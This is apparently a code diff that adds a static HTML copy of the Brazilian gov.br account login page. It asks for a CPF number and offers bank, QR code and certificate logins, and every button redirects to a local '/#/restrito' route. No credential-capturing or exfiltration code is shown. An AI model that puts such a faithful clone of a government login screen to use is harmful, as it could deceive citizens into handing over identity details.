@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <title>gov.br - Acesse sua conta</title>
+  <meta property="creator.productor" content="http://estruturaorganizacional.dados.gov.br/id/unidade-organizacional/2981">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+
+  <link rel="icon" href="https://sso.staging.acesso.gov.br/assets/govbr/img/favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="https://sso.staging.acesso.gov.br/assets/govbr/fontawesome/css/all.min.css">
+  <link rel="stylesheet" href="https://sso.staging.acesso.gov.br/assets/govbr/fonts/rawline/rawline.css">
+  <link rel="stylesheet" href="https://sso.staging.acesso.gov.br/assets/govbr/css/govbr-highcontrast.css">
+  <link rel="stylesheet" href="https://sso.staging.acesso.gov.br/assets/govbr/css/govbr-templates.css?v=15">
+  <link rel="stylesheet" href="https://sso.staging.acesso.gov.br/assets/govbr/css/govbr-modal.css?v=9">
+  <link rel="stylesheet" href="https://sso.staging.acesso.gov.br/assets/govbr/css/govbr-eula.css?v=4">
+  <script src="https://sso.staging.acesso.gov.br/assets/govbr/js/contrast.class.js"></script>
+  <script src="https://sso.staging.acesso.gov.br/assets/govbr/js/modal.js"></script>
+</head>
+
+<body>
+    <a tabindex="0" href="#conteudo" class="sr-only sr-only-focusable" aria-label="Pular para o conteÃºdo principal. Navegue sempre com a tecla TAB">Pular para o conteúdo principal</a>
+
+    <header>
+        <a href="https://www.gov.br"><img src="https://sso.staging.acesso.gov.br/assets/govbr/img/govbr.png" alt="Logomarca GovBR" /></a>
+        <div id="acessibilidade">
+            <span>
+                <a href="#" onClick="contrastScript().toggleContrast(event)"><i class="fas fa-adjust"></i><span>Alto Contraste</span></a>
+            </span>
+            <span>
+                <a href="//www.vlibras.gov.br" target="_BLANK"><i class="fas fa-deaf"></i><span>VLibras</span></a>
+            </span>
+        </div>
+        
+    </header>
+<div class="container">
+	<aside id="aside-signin">
+		<img id="identidade-govbr" src="https://sso.staging.acesso.gov.br/assets/govbr/img/conta_govbr_v2.jpg" alt="Logomarca GovBR" />
+	</aside>
+	<main id="main-signin">
+	<form method="post" id="loginData" action="/#/restrito" autocomplete="off" novalidate>
+		<div class="card" id="login-cpf">
+			<h3>Identifique-se no gov.br com:</h3>
+			<div class="item-login-signup-ways" onclick="accordion('accordion-panel-id')">
+					<a tabindex="3">
+						<img src="https://sso.staging.acesso.gov.br/assets/govbr/img/icons/id-card-solid.png">
+						Número do CPF
+					</a>
+				</div>
+				<div class="accordion-panel" id="accordion-panel-id">
+					<p>Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br</p>
+					<label for="cpf">CPF</label>
+					<input id="accountId" name="accountId" autocomplete="new-password" tabindex="1" type="tel" inputmode="numeric" value="" placeholder="Digite seu CPF" aria-invalid="false">
+					<div class="button-panel" id="login-button-panel">
+						<button id="enter-account-id" type="button" onclick="window.location.href='/#/restrito'" class="button-continuar" tabindex="2">Continuar</button>
+            			</div>
+				</div>
+				<label id="title-outras-op">Outras opções de identificação:</label>
+				<hr id="hr-outras-op" style="margin: 0 0 0">
+	
+	           
+	            <div class="item-login-signup-ways" onclick="showModal('modal-bancos-credenciados')" >
+						<button type="button" tabindex="5" class="button-href-mimic2" style="color:#008C32" onclick="showModal('modal-bancos-credenciados')" >
+							<img src="https://sso.staging.acesso.gov.br/assets/govbr/img/icons/InternetBanking-green.png" />
+							Login com seu banco
+							<span style="font-size: 7px; background-color: #008C32; color: white; padding: 3px; top: -3px; position: relative; margin-left: 8px;">SUA CONTA SERÁ PRATA</span>
+						</button>
+					</div>
+					<div class="modal-bancos-credenciados">
+						<div class="modal-content">
+							<h3>Bancos Credenciados</h3>
+							<p><b>Crie</b> ou <b>aumente o nível</b> da sua conta para <b>PRATA</b>, fazendo login com seu banco.</p>
+							<div id="providers-list" class="modal-providers-list">
+								<div class="item-login-signup-ways">
+										<button id="login-external-authentication-banco-do-brasil"
+											type="button" onclick="window.location.href='/#/restrito'"
+											class="button-href-mimic2" 
+											tabindex="3">
+											<img src="https://sso.staging.acesso.gov.br/assets/govbr/img/icons/bb_logo.png"/>
+											Banco do Brasil</button>				
+									</div>
+								</div>
+							<hr>
+							<div class="button-panel" id="modal-bancos-credenciados-button-panel">
+								<button class="button-cancel" type="button" id="btn-close-modal-bancos-credenciados" onclick="closeModal('modal-bancos-credenciados')">Cancelar</button>
+							</div>
+						</div>
+					</div>
+				<div class="item-login-signup-ways" onclick="showQrCode('ca0db258-ed3a-4235-b6c4-ee050c9ddc71');">
+						<a tabindex="5" href="#">
+						    <img src="https://sso.staging.acesso.gov.br/assets/govbr/img/icons/qrcode.png" />
+								Login com QR code
+					   		</a>
+					</div>
+				<div class="item-login-signup-ways" id="cert-digital">
+					<button id="login-certificate" type="button" onclick="window.location.href='/#/restrito'" class="button-href-mimic2" tabindex="4">
+						<img src="https://sso.staging.acesso.gov.br/assets/govbr/img/icons/CD.png" />
+						Seu certificado digital
+					</button>
+          </div>
+				<div class="item-login-signup-ways" id="cert-digital-cloud">
+						<button type="button" onclick="showModal('modal-certificado-nuvem')" class="button-href-mimic2" tabindex="5">
+							<img src="https://sso.staging.acesso.gov.br/assets/govbr/img/icons/CD-Nuvem.png" id="cert-digital-cloud-img" />
+							Seu certificado digital em nuvem
+						</button>
+					</div>
+					<div class="modal-certificado-nuvem">
+						<div class="modal-content">
+							<h3>Provedores de Certificados em Nuvem</h3>
+							<div class="item-login-signup-ways">
+									<button id="login-external-authentication-neoid-prod"
+										type="button" onclick="window.location.href='/#/restrito'"
+										class="button-href-mimic2" 
+										tabindex="3">
+										<img src="https://sso.staging.acesso.gov.br/assets/govbr/img/icons/serproid_logo.png"/>
+										SerproID Produção</button>
+								</div>
+							<hr>
+							<div class="button-panel" id="modal-bancos-credenciados-button-panel">
+								<button class="button-cancel" type="button" id="btn-close-modal-certificado-nuvem" onclick="closeModal('modal-certificado-nuvem')">Cancelar</button>
+							</div>
+						</div>
+					</div>
+				<div class="item-login-signup-ways" id="cert-digital">
+					<button type="button" id="login-uruguai" class="button-href-mimic2" tabindex="4" onclick="window.location.href='/#/restrito'" >
+						<img src="https://sso.staging.acesso.gov.br/assets/govbr/img/uruguai.png" style="height: 17px; margin-bottom: 3px;" />
+						Login com ID Uruguay
+						<span style="font-size: 7px; background-color: #008C32; color: white; padding: 3px; top: -3px; position: relative; margin-left: 8px;">BETA</span>
+					</button>
+				</div>
+			<div class="entenda-id-govbr" id="entenda-id-govbr">
+				<span>
+					<a tabindex="6" href="https://www.gov.br/governodigital/pt-br/conta-gov-br/ajuda-da-conta-gov.br" id="entenda-id-govbr-a">
+							<img src="https://sso.staging.acesso.gov.br/assets/govbr/fontawesome/webfonts/circle-question-solid.svg" style="margin: 0px 13px -2px 0px; height: 1em;"/>
+							Est&aacute; com d&uacute;vidas e precisa de ajuda?
+						</a>
+					<a tabindex="6" href="https://cadastro.staging.acesso.gov.br/termo-de-uso" style="display: block;" target="_blank" id="termo-de-uso">Termo de Uso e Aviso de Privacidade</a>
+				</span>
+			</div>
+		</div>
+			
+		<div id="hcaptcha"></div>
+		</form>
+	</main>
+</div>
+<div class="modal-qrcode">
+		<div class="modal-content" style="text-align: center; justify-content: space-evenly">
+			<h3>Login sem senha com QR code</h3>
+				<p style="text-align: justify; justify-content: space-evenly">Utilize o <strong>aplicativo gov.br</strong> para logar sem senha, usando apenas o leitor de QR code.</p>
+				<div id="qrcode" style="display: inline-block"></div>
+				<p style="text-align: justify; justify-content: space-evenly">
+					Você pode baixar o aplicativo <strong>gov.br</strong> gratuitamente nas lojas de aplicativos.
+				</p>
+				<p style="text-align: center">
+					<a href="https://play.google.com/store/apps/details?id=br.gov.meugovbr">
+						<img src="https://sso.staging.acesso.gov.br/assets/govbr/img/disponivel-no-google-play.png" alt="Android" style="width: 125px">
+					</a>
+					<a href="https://apps.apple.com/br/app/meu-gov-br/id1506827551">
+						<img src="https://sso.staging.acesso.gov.br/assets/govbr/img/disponivel-na-apple-store.png" alt="iOS" style="width: 125px">
+					</a>
+				</p>
+				<div class="button-panel">
+					<button class="button-cancel" type="button" id="btn-close-modal-qrcode" onclick="stopQrCode()">Cancelar</button>
+				</div>
+		</div>
+	</div>
+
+  <footer>
+  </footer>
+  <script src="https://sso.staging.acesso.gov.br/assets/vendors/jquery/jquery-2.2.4.min.js"></script>
+  <script src="https://sso.staging.acesso.gov.br/assets/govbr/js/scripts.js"></script>
+  <script src="https://sso.staging.acesso.gov.br/assets/vendors/jquery/jquery.maskedinput.js"></script>
+</body>
+</html>
